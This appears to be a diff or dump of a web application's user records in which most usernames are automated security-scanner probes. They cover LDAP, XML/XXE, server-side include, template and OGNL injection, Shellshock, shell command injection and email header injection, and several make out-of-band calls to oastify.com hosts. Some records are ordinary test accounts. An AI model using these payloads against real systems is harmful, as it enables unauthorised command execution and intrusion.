+{"id":299,"fullName":"AbNXJQQb AbNXJQQb","username":"./AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 300
+{"id":300,"fullName":"AbNXJQQb AbNXJQQb","username":"././AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 301
+{"id":301,"fullName":"AbNXJQQb AbNXJQQb","username":"nhz/AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 302
+{"id":302,"fullName":"AbNXJQQb AbNXJQQb","username":"./register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 303
+{"id":303,"fullName":"AbNXJQQb AbNXJQQb","username":".../register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 304
+{"id":304,"fullName":"AbNXJQQb AbNXJQQb","username":"woi/register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 305
+{"id":305,"fullName":"AbNXJQQb AbNXJQQb","username":"././register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 306
+{"id":306,"fullName":"AbNXJQQb AbNXJQQb","username":"/./register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 307
+{"id":307,"fullName":"AbNXJQQb AbNXJQQb","username":"/.../register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 308
+{"id":308,"fullName":"AbNXJQQb AbNXJQQb","username":"/uxc/register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 309
+{"id":309,"fullName":"AbNXJQQb AbNXJQQb","username":"/././register","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 310
+{"id":310,"fullName":"AbNXJQQb AbNXJQQb","username":"48ncytkijr)(objectClass=*","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 311
+{"id":311,"fullName":"AbNXJQQb AbNXJQQb","username":"cgpqhlfvnp)(!(objectClass=*)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 312
+{"id":312,"fullName":"AbNXJQQb AbNXJQQb","username":"aqx3p8uj08)(!(!(objectClass=*))","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 313
+{"id":313,"fullName":"AbNXJQQb AbNXJQQb","username":"xh5iga9opc)(!(!(!(objectClass=*)))","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 314
+{"id":314,"fullName":"AbNXJQQb AbNXJQQb","username":"*)(objectClass=*","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 315
+{"id":315,"fullName":"AbNXJQQb AbNXJQQb","username":"*)(!(objectClass=*)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 316
+{"id":316,"fullName":"AbNXJQQb AbNXJQQb","username":"*)(!(!(objectClass=*))","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 317
+{"id":317,"fullName":"AbNXJQQb AbNXJQQb","username":"*)(!(!(!(objectClass=*)))","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 318
+{"id":318,"fullName":"AbNXJQQb AbNXJQQb","username":"<dpw xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://iqc3cs1cuffwm1nxxvzna3ls0j6cufif67txhm.oastify.com/dpw.xsd\">dpw</dpw>","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 319
+{"id":319,"fullName":"AbNXJQQb AbNXJQQb","username":"<slm xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://darywnl7eazr6w7shqjiuy5nkeq7ea2bq3dt1i.oastify.com/foo\"/></slm>","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 320
+{"id":320,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb]]>><","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 321
+{"id":321,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'+(function(){if(typeof nh3uz===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);nh3uz=1;}}())+'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 322
+{"id":322,"fullName":"AbNXJQQb AbNXJQQb","username":"\"-->'-->`--><!--#set var=\"qua\" value=\"pt9afz4jxm\"--><!--#set var=\"swc\" value=\"rvbch16lzo\"--><!--#echo var=\"qua\"--><!--#echo var=\"swc\"--><!--#exec cmd=\"nslookup -q=cname cgwx2mr6k95qcvdrnpph0xbmqdw6k9816pyco0d.oastify.com\" -->","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 323
+{"id":323,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb\r\nBCC:8y7tki9225nmurvn5l7ditti89e225qxjlb81wq@oastify.com\r\nrxk: r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 324
+{"id":324,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb>\r\nBCC:d8myunj7caxr4w5sfqhisy3nieo7ca02uqmdc11@oastify.com\r\nalp: t","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 325
+{"id":325,"fullName":"AbNXJQQb AbNXJQQb","username":"${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"timeout\",\"4\"})).start()).getInputStream()))).readLine()}${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"sleep\",\"4\"})).start()).getInputStream()))).readLine()}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 326
+{"id":326,"fullName":"AbNXJQQb AbNXJQQb","username":"${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"timeout\",\"0\"})).start()).getInputStream()))).readLine()}${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"sleep\",\"0\"})).start()).getInputStream()))).readLine()}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 327
+{"id":327,"fullName":"AbNXJQQb AbNXJQQb","username":"\u0003 /bin/sleep 4 \r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 328
+{"id":328,"fullName":"AbNXJQQb AbNXJQQb","username":"\u0003 /bin/sleep 0 \r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 329
+{"id":329,"fullName":"AbNXJQQb AbNXJQQb","username":"'\r /bin/sleep 4 \r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 330
+{"id":330,"fullName":"AbNXJQQb AbNXJQQb","username":"'\r /bin/sleep 0 \r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 331
+{"id":331,"fullName":"AbNXJQQb AbNXJQQb","username":"() { :;}; /bin/sleep 4","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 332
+{"id":332,"fullName":"AbNXJQQb AbNXJQQb","username":"() { :;}; /bin/sleep 0","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 333
+{"id":333,"fullName":"AbNXJQQb AbNXJQQb","username":"|sleep 4 & ping -n 4 localhost & ping -c 4 localhost","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 334
+{"id":334,"fullName":"AbNXJQQb AbNXJQQb","username":"|sleep 0 & ping -n 0 localhost & ping -c 0 localhost","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 335
+{"id":335,"fullName":"AbNXJQQb AbNXJQQb","username":"$$(sleep 4)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 336
+{"id":336,"fullName":"AbNXJQQb AbNXJQQb","username":"$$(sleep 0)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 337
+{"id":337,"fullName":"AbNXJQQb AbNXJQQb","username":"`sleep 4`","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 338
+{"id":338,"fullName":"AbNXJQQb AbNXJQQb","username":"`sleep 0`","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 339
+{"id":339,"fullName":"AbNXJQQb AbNXJQQb","username":"\"\r /bin/sleep 4 \r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 340
+{"id":340,"fullName":"yay yay","username":"yayayaya1212","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 341
+{"id":341,"fullName":"AbNXJQQb AbNXJQQb","username":"\"\r /bin/sleep 0 \r","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 342
+{"id":342,"fullName":"AbNXJQQb AbNXJQQb","username":"() { _; } >_[$$($$())] { /bin/sleep 4; }","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 343
+{"id":343,"fullName":"AbNXJQQb AbNXJQQb","username":"() { _; } >_[$$($$())] { /bin/sleep 0; }","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 344
+{"id":344,"fullName":"Hao Hao","username":"Hao","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 345
+{"id":345,"fullName":"AbNXJQQb AbNXJQQb","username":"k5G5<!--esi-->mei8<!--esx-->gMwD","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 346
+{"id":346,"fullName":"AbNXJQQb AbNXJQQb","username":"a'a\\'b\"c>?>%}}%%>c<[[?${{%}}cake\\","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 347
+{"id":347,"fullName":"AbNXJQQb AbNXJQQb","username":"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://zadb4h4g4ty4xixpe1oqjh9xpovej3.oastify.com/xxe\"><a></a>'}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 348
+{"id":348,"fullName":"AbNXJQQb AbNXJQQb","username":"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=('ping c2fzu61u05pjs8fj5ddx8q12nttjh8.urj01lroastify.com -c1').replace('urj01lr', '')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 349
+{"id":349,"fullName":"Thai Cao","username":"cthtzzz","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 350
+{"id":350,"fullName":"AbNXJQQb AbNXJQQb","username":"v5kdn9âªrn5b3p","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 351
+{"id":351,"fullName":"AbNXJQQb AbNXJQQb","username":"2060*3781","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 352
+{"id":352,"fullName":"AbNXJQQb AbNXJQQb","username":"${8661*4800}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 353
+{"id":353,"fullName":"AbNXJQQb AbNXJQQb","username":"%{6532*321}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 354
+{"id":354,"fullName":"AbNXJQQb AbNXJQQb","username":"wym3mfÄ±h1ltum","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 355
+{"id":355,"fullName":"AbNXJQQb AbNXJQQb","username":"gcjs01''k63sq3","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 356
+{"id":356,"fullName":"AbNXJQQb AbNXJQQb","username":"p6pnqoÎou2skv","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 357
+{"id":357,"fullName":"qq qq","username":"qq","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 358
+{"id":358,"fullName":"AbNXJQQb AbNXJQQb","username":"@(3704*5031)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 359
+{"id":359,"fullName":"AbNXJQQb AbNXJQQb","username":"jxgqprì½»ui49rq","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 360
+{"id":360,"fullName":"test testing","username":"testing123","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 361
+{"id":361,"fullName":"AbNXJQQb AbNXJQQb","username":"Ì¸xsczjg","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 362
+{"id":362,"fullName":"AbNXJQQb AbNXJQQb","username":"xz340fkobem71wrtqv","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 363
+{"id":363,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb$zq=%3c%61%60%27%22%24%7b%7b%5c&zq%3d","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 364
+{"id":364,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb%26zq=x%3c%61%60%27%22%24%7b%7b%5c","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 365
+{"id":365,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb|zqy=x%3c%61%60%27%22%24%7b%7b%5c","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 366
+{"id":366,"fullName":"AbNXJQQb AbNXJQQb","username":"ik3c5`z'z\"${{%{{\\","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 367
+{"id":367,"fullName":"AbNXJQQb AbNXJQQb","username":"jef69n2v82\\z`z'z\"${{%{{\\","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 368
+{"id":368,"fullName":"AbNXJQQb AbNXJQQb","username":"nuj5ufoan5","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 369
+{"id":369,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb/'z*/**/","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 370
+{"id":370,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb/**z'*/","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 371
+{"id":371,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb/*/*/z'*/","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 372
+{"id":372,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,abz(1)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 373
+{"id":373,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,abs(1)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 374
+{"id":374,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,abs(0,1)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 375
+{"id":375,"fullName":"AbNXJQQb AbNXJQQb","username":"../AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 376
+{"id":376,"fullName":"hyhy hyhy","username":"hyhy","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 377
+{"id":377,"fullName":"AbNXJQQb AbNXJQQb","username":"z/AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 378
+{"id":378,"fullName":"AbNXJQQb AbNXJQQb","username":"./././AbNXJQQb","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 379
+{"id":379,"fullName":"a b","username":"ngng","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 380
+{"id":380,"fullName":"linh linh","username":"linh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 381
+{"id":381,"fullName":"abc abc","username":"abc123","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 382
+{"id":382,"fullName":"aaa aaa","username":"thanhnhat","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 383
+{"id":383,"fullName":"Hoang Thai Phan Minh","username":"__324325gt","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 384
+{"id":384,"fullName":"huh 123","username":"user","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 385
+{"id":385,"fullName":"frez zz","username":"frez","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 386
+{"id":386,"fullName":"sadgfhdg sadgfhdg","username":"sadgfhdg","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 387
+{"id":387,"fullName":"whoami w","username":"w","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 388
+{"id":388,"fullName":"test1 nvn","username":"nvngo2c","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 389
+{"id":389,"fullName":"nguyen dang","username":"2287700016","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 390
+{"id":390,"fullName":"tran le","username":"admin11","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
